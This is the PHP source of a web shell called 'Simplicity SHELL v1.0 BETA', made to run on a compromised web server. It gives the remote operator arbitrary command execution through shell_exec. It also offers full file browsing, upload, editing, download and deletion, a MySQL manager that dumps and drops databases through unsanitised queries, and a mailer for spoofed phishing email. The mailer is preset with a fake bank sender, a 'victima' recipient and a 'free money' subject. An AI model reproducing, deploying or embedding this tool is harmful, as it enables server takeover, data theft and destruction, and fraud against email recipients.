<?php
  /*
   @Autor->Xt3mP@und3rgr0und.org
   */
  //Size
  function show_size($size_file)
  {
      if ($size_file >= 1073741824) {
          $size_file = round($size_file / 1073741824) . " GB";
      } elseif ($size_file >= 1048576) {
          $size_file = round($size_file / 1048576) . " MB";
      } elseif ($size_file >= 1024) {
          $size_file = round($size_file / 1024) . " KB";
      } else {
          $size_file = $size_file . " B";
      }
      return $size_file;
  }
  //Rename
  function rename_file($file_name, $file_rename)
  {
      $renaming = rename($file_name, $file_rename);
      if (!$renaming) {
          $status_renaming = "No se pudo renombrar el archivo: " . $file_name;
      } else {
          $status_renaming = "El archivo: " . $file_name . " fue renombrado por: " . $file_rename;
      }
      return $status_renaming;
  }
  set_time_limit(0);
  //Images
  $img = array("<img src='http://img835.imageshack.us/img835/8704/deletea.png' border='0'>", "<img src='http://img839.imageshack.us/img839/9558/downloadgqq.png' border='0'>", "<img src='http://img834.imageshack.us/img834/4406/1286404231pagewhiteedit.png' border='0'>");
  //Server info
  $SERVER_version = $_SERVER['SERVER_SOFTWARE'];
  $PHP_version = PHP_VERSION;
  $PHP_os = PHP_OS;
  $SERVER_host = $_SERVER['HTTP_HOST'];
  $SERVER_script = $_SERVER['SCRIPT_FILENAME'];
  $SERVER_docroot = $_SERVER['DOCUMENT_ROOT'];
  $SERVER_adminmail = $_SERVER['SERVER_ADMIN'];
  $SERVER_protocol = $_SERVER['SERVER_PROTOCOL'];
  $SERVER_gateface = $_SERVER['GATEWAY_INTERFACE'];
  $SERVER_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
  $SERVER_ip = $_SERVER['SERVER_ADDR'];
  //Download action
  if ($_GET['do'] == "nav" && $_GET['act'] == "download") {
      if (file_exists($SERVER_docroot . $_GET['path'])) {
          $file_download = $SERVER_docroot . "/" . $_GET['path'];
          $name = pathinfo($file_download);
          header("Content-Disposition: attachment; filename=" . $name['filename'] . "." . $name['extension'] . "\n\n");
          header("Content-Type: application/octet-stream");
          header("Content-Length: " . filesize($file_download));
          readfile($file_download);
      } else {
          echo "No existe el archivo";
      }
      exit();
  }
?>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head><title>Simplicity@<?php
  echo $SERVER_ip;
?></title>
<style type="text/css">
body {background-image: url(http://img833.imageshack.us/img833/8882/backgroundff.png);background-repeat: repeat;margin-top: 0px;}
td,th, body {color: #F2F2F2;font-family: verdana;font-size: 11px;font-weight: bold;}
a:link, a:visited, a:focus {color:#01939A; text-decoration:none;}
a:hover{color:#FFFFFF;}
input, textarea {-moz-border-radius: 3px;-webkit-border-radius: 3px; background-color: #222222;border: 1px solid #2D2D2D;border-radius: 2px;color: #379A8D;font-family: Verdana;font-size: 10px;margin: 3px;padding: 3px;}
input:focus, textarea:focus, input:hover, textarea:hover {background-color: #333333;border: 1px solid #00CCFF;color: #F2F2F2;}
hr {background:#2D2D2D; border: 1px solid #2D2D2D}
#container {width:1000px; margin: 0 auto;}
#header {width:100%; float:left; height:200px; text-align:center;}
#body {width:100%; float:left;  height:auto;}
#footer{width:100%; float:left;  height:30px;}
</style>
<div id="container"><div id="header"><img src="http://img834.imageshack.us/img834/4254/banneritv.png"></div><div id="body">
<?php
  //Server info
  echo "<hr noshade color='white'>";
  echo "<div align='center'>     <a href='?do=nav'>Home</a> ~     <a href='?do=mailer'>Mailer</a> ~      <a href='?do=sql'>SQL Manager</a> ~      <a href='?do=contact'>Contact</a></div>";
  echo "<hr noshade color='white'>";
  echo "Version del servidor: " . $SERVER_version . "<br />Version del PHP: " . $PHP_version . "<br />Sistema operativo del servidor: " . $PHP_os . "<br />Host del servidor: " . $SERVER_host . "<br />Direccion del script: " . $SERVER_script . "<br />Direccion del \"admin path\": " . $SERVER_docroot . "<br />Direccion del mail del admin: " . $SERVER_adminmail . "<br />Protocolo del servidor: " . $SERVER_protocol . "<br />CGI: " . $SERVER_gateface . "<br />Lenguajes del servidor: " . $SERVER_language . "<br />Direccion IP del servidor: " . $SERVER_ip . "<br />";
  //Mailer
  if ($_GET['do'] == "mailer") {
      echo "<hr noshade color='white'>";
      echo "<form action='' method='POST'><table align='center'>";
      echo '<tr><td>Nombre:</td><td><input type="text" size="30" value="Bancos S.A de C.V" name="mname"></td><td rowspan="4">    <textarea rows="10" cols="60" name="message">Mensaje para victima</textarea></td></tr>   <tr><td>Para</td><td><input type="text" size="30" value="msn@victima.com" name="to"></td><td rowspan="4">   <tr><td>De</td><td><input type="text" size="30" value="oficial@bancos.com" name="from"></td></tr>    <tr><td>Asunto</td><td><input type="text" size="30" value="Dinero gratis/ Free money" name="subject"></td></tr>    <tr><td colspan="3"><div align="center"><input type="submit" value="Enviar" style="width: 400px" name="mail"></div></td></tr>';
      echo "</table></form>";
  }
  if (isset($_POST['mail'])) {
      $mname = strip_tags($_POST['mname']);
      $to = strip_tags($_POST['to']);
      $from = strip_tags($_POST['from']);
      $subject = strip_tags($_POST['subject']);
      $message = strip_tags($_POST['message']);
      $headers = "MINE-Version: 1.0\r\n";
      $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
      $headers .= "From: " . $mname . " <" . $from . ">\r\n";
      $headers .= "Reply-To: " . $from . "\r\n";
      $sending = @mail($to, $subject, $message, $headers);
      if ($sending) {
          echo "<div align='center'>Correo enviado a: " . $to . "</div>";
      } else {
          echo "<div align='center'>No se pudo enviar el correo a: " . $to . "</div>";
      }
  }
  //SQL
  if ($_GET['do'] == "sql") {
      if ($_GET['do'] == "sql" && $_GET['server'] != "" && $_GET['user'] != "" && $_GET['pass'] != "") {
          $connection = @mysql_connect($_GET['server'], $_GET['user'], $_GET['pass']);
          //If connection was succefull show databases        
          if ($connection) {
              echo "<hr noshade color='white'>";
              echo "<form action='' method='POST'>";
              echo "<table width='400' align='center'><tr><td colspan='3'>Servidor: " . $_GET['server'] . " ~ Usuario: " . $_GET['user'] . " ~ Password: " . $_GET['pass'] . "</td></tr>";
              echo "<tr><td colspan='3'><div align='center'>Crear base de datos:        <input type='text' name='new_db' value='Base de datos'>        <input type='submit' name='newdb' value='Crear'></div></td></tr>";
              //New DB
              if (isset($_POST['newdb'])) {
                  $new_db = mysql_query("CREATE DATABASE " . $_POST['new_db'] . " ") or die(mysql_error());
                  if ($new_db) {
                      echo "<tr><td colspan='3'><div align='center'>Base de datos: <font color='red'>" . $_POST['new_db'] . "</font> creada correctamente.</div></td></tr>";
                  } else {
                      echo "<tr><td colspan='3'><div align='center'>La base de datos: <font color='red'>" . $_POST['new_db'] . "</font> no se pudo crear.</div></td></tr>";
                  }
              }
              //Drop DB
              if ($_GET['actsql'] == "del") {
                  echo "<tr><td colspan='3'><div align='center'>Quieres eliminar la base de datos: <font color='red'>" . $_GET['db'] . "</font>?          <input type='submit' name='deldb' value='Si'><input type='submit' name='nodeldb' value='No'></div></td></tr>";
                  //Drop DB right now!
                  if (isset($_POST['deldb'])) {
                      $drop_db = mysql_query("DROP DATABASE " . $_GET['db'] . " ");
                      if ($drop_db) {
                          echo "<script>alert('Base de datos eliminada correcamente');</script>";
                          echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=sql&server=' . $_GET['server'] . '&user=' . $_GET['user'] . '&pass=' . $_GET['pass'] . '"> ';
                      } else {
                          echo "<tr><td colspan='3'><div align='center'>La base de datos: <font color='red'>" . $_POST['new_db'] . "</font> no se pudo eliminar.</div></td></tr>";
                      }
                  } elseif (isset($_POST['nodeldb'])) {
                      echo "<script>alert('La base de datos no fue eliminada');</script>";
                      echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=sql&server=' . $_GET['server'] . '&user=' . $_GET['user'] . '&pass=' . $_GET['pass'] . '&db=' . $_GET['db'] . '"> ';
                  }
              }
              echo "</table>";
              echo "<hr noshade color='white'>";
              $show_db = mysql_query("SHOW databases") or die(mysql_error());
              echo "<table width='300' align='center' border='0'><tr><td>Base de datos</td><td>Accion</td></tr>";
              while ($name_db = mysql_fetch_array($show_db)) {
                  echo "<tr><td><a href='?do=sql&server=" . $_GET['server'] . "&user=" . $_GET['user'] . "&pass=" . $_GET['pass'] . "&db=" . $name_db[0] . "'>" . $name_db[0] . "</td>      <td><a href='?do=sql&server=" . $_GET['server'] . "&user=" . $_GET['user'] . "&pass=" . $_GET['pass'] . "&db=" . $name_db[0] . "&actsql=del'>" . $img[0] . "</a>" . $img[1] . "</td></tr>";
              }
              echo "</table>";
              //Show content of databases            
              if ($_GET['db'] != "") {
                  mysql_select_db($_GET['db'], $connection) or die("No se puede seleccionar la base de datos: " . mysql_error() . " porque no existe.");
                  $show_content_db = mysql_query("SHOW TABLES") or die(mysql_error());
                  echo "<hr noshade color='white'>";
                  echo "<div align='center'>Base de datos seleccionada: " . $_GET['db'] . "</div>";
                  echo "<hr noshade color='white'>";
                  //Describe tables of databases                
                  if ($_GET['table'] != "") {
                      echo '<table width="500" align="center" border="1">';
                      echo '<div align="center">Tabla: <font color="red">' . $_GET['table'] . '</font></div>';
                      echo "<hr noshade color='white'>";
                      $table_fields = mysql_query("DESCRIBE " . $_GET['table']) or die(mysql_error());
                      $table_content = mysql_query("SELECT * FROM " . $_GET['table']) or die(mysql_error());
                      $num_fields = mysql_num_fields($table_fields) or die(mysql_error());
                      //If table exists          
                      $field = "";
                      $body = "";
                      echo "<div align='center'>Espacios en blanco = No existe valor ~</div><table width='100%' border='1' align='center'><tr>";
                      while ($fields = mysql_fetch_array($table_fields)) {
                          echo "<td><div align='center'>" . $fields['Field'] . "</div></td>";
                      }
                      echo "</tr></table>";
                      while ($body_content = mysql_fetch_array($table_content)) {
                          echo "<hr noshade color='white'>";
                          for ($i = 0; $i < $num_fields; $i++) {
                              echo "<table width='100%' align='center'><tr><td>" . $body_content[$i] . "</td></tr></table>";
                          }
                      }
                  } else {
                      while ($show_tables = mysql_fetch_array($show_content_db)) {
                          $num_of_rows = mysql_num_rows(mysql_query("SELECT * FROM " . $show_tables[0]));
                          $describe_tables_db = mysql_query("DESCRIBE " . $show_tables[0]) or die("No se puede ejecutar la consulta: " . mysql_error());
                          echo '<table width="500" align="center">';
                          echo '<tr><th colspan="4"><font color="red">                <a href="?do=sql&server=' . $_GET['server'] . '&user=' . $_GET['user'] . '&pass=' . $_GET['pass'] . '&db=' . $_GET['db'] . '&table=' . $show_tables[0] . '">' . $show_tables[0] . '</a></font></th></tr>';
                          echo '<tr><td><font color="#00CCCC">Campos</font></td><td><font color="#00CCCC">Tipo</font></td>                <td><font color="#00CCCC">Null</font></td><td><font color="#00CCCC">Key</font></td></tr>';
                          while ($describe_tables = mysql_fetch_array($describe_tables_db)) {
                              echo '<tr><td>' . $describe_tables['Field'] . '</td><td>' . $describe_tables['Type'] . '</td><td>' . $describe_tables['Null'] . '</td><td >' . $describe_tables['Key'] . '</td></tr>';
                          }
                          echo '<tr><td><font color="red">Numero de filas:</font> ' . $num_of_rows . '</td></tr></table><br />';
                      }
                  }
              }
              //DB            
              echo "</form>";
          } else {
              //If connection wasn't succefull            
              echo "<hr noshade color='white'>";
              echo "No se pudo conectar con la base de datos.";
          }
      } else {
          echo "<hr noshade color='white'>";
          echo "<form action='' method='POST'>      <table width='400' border='0' align='center'>      <tr><td align='right'>Servidor:</td><td><input type='text' value='localhost' name='server_sql'></td></tr>       <tr><td align='right'>Usuario:</td><td><input type='text' value='root' name='user_sql'></td></tr>      <tr><td align='right'>Pass:</td><td><input type='password' value='********' name='pass_sql'><input type='submit' name='sql' value='Verificar'></td></tr>      </table></form>";
      }
  }
  //Contact
  if ($_GET['do'] == "contact") {
      echo "<hr noshade color='white'>";
      echo "<div align='center'>Xt3mP(at)und3gr0und(dot)com</div>";
  }
  //SQL isset
  if (isset($_POST['sql'])) {
      echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=sql&server=' . $_POST['server_sql'] . '&user=' . $_POST['user_sql'] . '&pass=' . $_POST['pass_sql'] . '"> ';
  }
  //Change file name
  if (isset($_POST['change_file_name'])) {
      if (empty($_POST['file_name'])) {
          echo "<script>alert('Nombre incorrecto');</script>";
      } else {
          $explode = explode(".", $_POST['file_name']);
          $info = pathinfo($SERVER_docroot . "/" . $_GET['path']);
          if (count($explode) < 2) {
              echo "Tiene que tener extension el archivo";
          } else {
              if (file_exists($info['dirname'] . "/" . $_POST['file_name'])) {
                  echo "<script>alert('Ya existe un archivo con ese nombre');</script>";
              } else {
                  echo rename_file($info['dirname'] . "/" . $info['filename'] . "." . $info['extension'], $info['dirname'] . "/" . $_POST['file_name']);
                  echo "<script>alert('Nombre cambiado correctamente');</script>";
                  echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?"> ';
              }
          }
      }
  }
  //Change path name
  if (isset($_POST['change_path_name'])) {
      $dir_path = pathinfo($SERVER_docroot . $_GET['path']);
      if (!file_exists($dir_path['dirname'] . "/" . $_POST['path_name'])) {
          if (!is_dir($SERVER_docroot . $_GET['path'] . "/")) {
              echo "No se puede renombrar el directorio.";
          } else {
              rename($SERVER_docroot . $_GET['path'], $dir_path['dirname'] . "/" . $_POST['path_name']);
          }
          echo "<script>alert('Nombre cambiado correctamente');</script>";
          echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?"> ';
      } else {
          echo "<script>alert('Ya existe un directorio con ese nombre');</script>";
      }
  }
  //Deleting file or path
  if (isset($_POST['del'])) {
      if (is_dir($SERVER_docroot . $_GET['path'] . "/")) {
          $deleting = @rmdir($SERVER_docroot . $_GET['path'] . "/");
          if ($deleting) {
              echo "<script>alert('Borrado correctamente');</script>";
              echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?"> ';
          } else {
              echo "<script>alert('No se pudo borrar el directorio porque no esta vacio');</script>";
          }
      } else {
          @unlink($SERVER_docroot . $_GET['path']);
          echo "<script>alert('Borrado correctamente');</script>";
          echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?"> ';
      }
  } elseif (isset($_POST['nodel'])) {
      echo "<script>alert('No se borro el archivo');</script>";
      echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=nav&path=' . $_GET['path'] . '"> ';
  }
  //Change file content
  if (isset($_POST['change_file_contents'])) {
      $put = fopen($SERVER_docroot . "/" . $_GET['path'], "w+");
      if ($put) {
          fwrite($put, $_POST['file_content']);
          fclose($put);
          echo "<script>alert('Contenido cambiado correctamente');</script>";
          echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=nav&path=' . $_GET['path'] . '"> ';
      } else {
          echo "No se pudo cambiar el contenido";
      }
  }
  //Upload file
  if (isset($_POST['uploadfile'])) {
      $name = $_FILES['upload_file']['name'];
      $size = $_FILES['upload_file']['size'];
      $type = $_FILES['upload_file']['type'];
      $temp_name = $_FILES['upload_file']['tmp_name'];
      if (move_uploaded_file($temp_name, $SERVER_docroot . "/" . $_GET['path'] . "/" . $name)) {
          echo "bien";
      } else {
          echo "mal";
      }
  }
  //Create file
  if (isset($_POST['createfile'])) {
      $name_new_file = $_POST['new_file'];
      if (file_exists($SERVER_docroot . $_GET['path'] . "/" . $name_new_file)) {
          echo "<script>alert('Ya existe una carpeta con ese nombre');</script>";
      } else {
          echo "test";
      }
  }
  //Create dir
  if (isset($_POST['createdir'])) {
      $name_new_dir = $_POST['new_dir'];
      if (file_exists($SERVER_docroot . $_GET['path'] . "/" . $name_new_dir)) {
          echo "<script>alert('Ya existe una carpeta con ese nombre');</script>";
      } else {
          mkdir($SERVER_docroot . $_GET['path'] . "/" . $name_new_dir, "0777");
          echo "<script>alert('Carpeta creada correctamente');</script>";
      }
  }
  //Execute
  if (isset($_POST['execute'])) {
      echo "<hr noshade color='white'>";
      echo "Resultado de la ejecucin del comando: " . $_POST['exec'];
      echo "<textarea rows='10' cols='170'>" . shell_exec($_POST['exec']) . "</textarea>";
  }
  //Go file or dir
  if (isset($_POST['go_dir']) or isset($_POST['go_file'])) {
      if (isset($_POST['go_dir'])) {
          $direction = $_POST['godir'];
      } elseif (isset($_POST['go_file'])) {
          $direction = $_POST['gofile'];
      }
      echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=?do=nav&path=' . $direction . '"> ';
  }
  //Delete action
  if ($_GET['do'] == "nav" && $_GET['act'] == "del") {
      echo "<hr noshade color='white'>";
      if (file_exists($SERVER_docroot . $_GET['path'])) {
          echo "<form action='' method='POST'><div align='center'>Seguro que quieres borrar: " . $_GET['path'] . "?<br /><input type='submit' value='Si' name='del'> <input type='submit' value='No' name='nodel'></div></form>";
      } else {
          echo "No existe el archivo";
      }
  }
  //Edit action
  if ($_GET['do'] == "nav" && $_GET['act'] == "edit") {
      echo "<hr noshade color='white'>";
      if (file_exists($SERVER_docroot . $_GET['path'])) {
          $pn = pathinfo($SERVER_docroot . "/" . $_GET['path']);
          echo "<form action='' method='POST'><div align='center'><a href='javascript:history.go(-1);'>Atras</a><br />                          Cambiar nombre: <input type='text' name='path_name' value='" . $pn['filename'] . "'>                          <input type='submit' value='Cambiar' name='change_path_name'></center></form><br /></div>";
      } else {
          echo "No existe el archivo";
      }
  }
  //Other actions
  echo "<hr noshade color='white'>";
  echo "<table width='900' border='0' align='center'>          <form action='' method='POST'  enctype='multipart/form-data'>          <tr><td>Subir archivo:</td><td>Crear archivo:</td><td>Crear carpeta:</td></tr>          <tr><td><input type='file' name='upload_file'><br /><input type='submit' name='uploadfile' value='Subir'></td>          <td><input type='text' name='new_file' value='" . $_GET['path'] . "/nombre.extension' size='50'><br />          <input type='submit' name='createfile' value='Crear'></td>          <td><input type='text' name='new_dir' value='" . $_GET['path'] . "' size='50'><br />          <input type='submit' name='createdir' value='Crear'></td></tr>          <tr><td>Ejecutar:</td><td>Ir a archivo:</td><td>Ir a carpeta:</td></tr>          <tr><td><input type='text' name='exec' value='Comando'><br />          <input type='submit' name='execute' value='Ejecutar'></td>          <td><input type='text' name='gofile' value='" . $_GET['path'] . "' size='50'><br />          <input type='submit' name='go_file' value='Ir'></td>          <td><input type='text' name='godir' value='" . $_GET['path'] . "' size='50'><br />          <input type='submit' name='go_dir' value='Ir'></td></tr>          </form></table>";
  echo "<hr noshade color='white'><br />";
  //Show dir (If empty GET)
  if ($_GET['do'] == "" or $_GET['path'] == "") {
      $dir = opendir($SERVER_docroot);
      echo '<table width="800" border="0" align="center">';
      while ($object = readdir($dir)) {
          if ($object == "." or $object == "..") {
              echo "<tr><td><a href='javascript:history.go(-1);'>" . $object . "</a></td><td>---</td></tr>";
          } elseif ($object != "." or $object != "..") {
              if (is_dir($SERVER_docroot . "/" . $object)) {
                  echo "<tr><td><a href='?do=nav&path=/" . $object . "'>" . $object . "</a></td><td>---</td><td>                        <a href='?do=nav&path=/" . $object . "&act=del'>" . $img[0] . "</a><a href='?do=nav&path=/" . $object . "&act=edit'>" . $img[2] . "</a></td></tr>";
              } else {
                  echo "<tr><td><a href='?do=nav&path=" . $object . "'>" . $object . "</a></td><td>" . show_size(filesize($SERVER_docroot . "/" . $object)) . "</td><td>                        <a href='?do=nav&path=/" . $object . "&act=del'>" . $img[0] . "</a><a href='?do=nav&path=/" . $object . "&act=download'>" . $img[1] . "</a></td></tr>";
              }
          }
      }
      echo '</table>';
  } else {
      //If not empty GET    
      //Show dir (If not empty GET)    
      if ($_GET['do'] == "nav" && $_GET['path'] != "") {
          //If is path        
          if (@opendir($SERVER_docroot . "/" . $_GET['path'])) {
              $dir = @opendir($SERVER_docroot . "/" . $_GET['path']);
              echo '<table width="800" border="0" align="center">';
              while ($object = readdir($dir)) {
                  if ($object == "." or $object == "..") {
                      echo "<tr><td><a href='javascript:history.go(-1);'>" . $object . "</a></td></tr>";
                  } elseif ($object != "." or $object != "..") {
                      if (@is_dir($SERVER_docroot . "/" . $_GET['path'] . "/" . $object)) {
                          echo "<tr><td><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "'>" . $object . "</a></td><td>---</td><td><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "&act=del'>" . $img[0] . "</a><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "&act=edit'>" . $img[2] . "</td></tr>";
                      } else {
                          echo "<tr><td><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "'>" . $object . "</a></td><td>" . show_size(filesize($SERVER_docroot . "/" . $_GET['path'] . "/" . $object)) . "</td><td><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "&act=del'>" . $img[0] . "</a><a href='?do=nav&path=" . $_GET['path'] . "/" . $object . "&act=download'>" . $img[1] . "</a></td></tr>";
                      }
                  }
              }
              echo '</table>';
          } else {
              //If is not path            
              if (file_exists($SERVER_docroot . "/" . $_GET['path'])) {
                  $e = pathinfo($SERVER_docroot . "/" . $_GET['path']);
                  echo '<table width="800" border="0" align="center">';
                  if ($e['extension'] == "php" or $e['extension'] == "txt" or $e['extension'] == "css" or $e['extension'] == "html" or $e['extension'] == "js") {
                      $open_file = file_get_contents($SERVER_docroot . "/" . $_GET['path'], "w+");
                      echo "<tr><td><a href='javascript:history.go(-1);'>.</a></td></tr>";
                      echo "<tr><td><a href='javascript:history.go(-1);'>..</a></td></tr>";
                      echo "<tr><td>Eliminar: <a href='?do=nav&path=/" . $_GET['path'] . "&act=del'>" . $img[0] . "</a></td><td>Descargar: <a href='?do=nav&path=/" . $_GET['path'] . "/" . $object . "&act=download'>" . $img[1] . "</a></td></tr>";
                      echo "<tr><td><form action='' method='POST'>Cambiar nombre:</td><td>                                        <input type='text' name='file_name' value='" . $e['filename'] . "." . $e['extension'] . "'>                                        <input type='submit' value='Cambiar' name='change_file_name'></form></td><td>";
                      echo "<tr><td colspan='4'><form action='' method='POST'><textarea rows='20' cols='170' name='file_content'>" . $open_file . "</textarea></td></tr>";
                      echo "<tr><td><input type='submit' value='Cambiar' name='change_file_contents'></form></td></tr>";
                  } else {
                      echo "<tr><td><a href='javascript:history.go(-1);'>.</a></td><td>&nbsp;</td><td>&nbsp;</td></tr>";
                      echo "<tr><td><a href='javascript:history.go(-1);'>..</a></td><td>&nbsp;</td><td>&nbsp;</td></tr>";
                      echo "<form action='' method='POST'>";
                      echo "<tr><td>Cambiar nombre:</td><td><input type='text' name='file_name' value='" . $e['filename'] . "." . $e['extension'] . "'></td><td><a href='?do=nav&path=" . $_GET['path'] . "&act=del'>" . $img[0] . "</a><a href='?do=nav&path=" . $_GET['path'] . "&act=download'>" . $img[1] . "</a></td></tr>";
                      echo "<tr><td></td><td><input type='submit' value='Cambiar' name='change_file_name'></td></tr>";
                  }
                  echo "</form>";
                  echo '</table>';
              } else {
                  //If file not exists                
                  echo "archivo no existe";
              }
          }
          //Close off is path (opendir)
      }
      //Close off if not empty GET
  }
  //Close of not empty GET
  echo "<hr noshade color='white'>";
  echo '</div><div id="footer"><div align="center"><br />Simplicity SHELL v1.0 BETA by Xt3mP ~ Xt3mP(at)und3rgr0und(dot)org</div></div></div>';
?>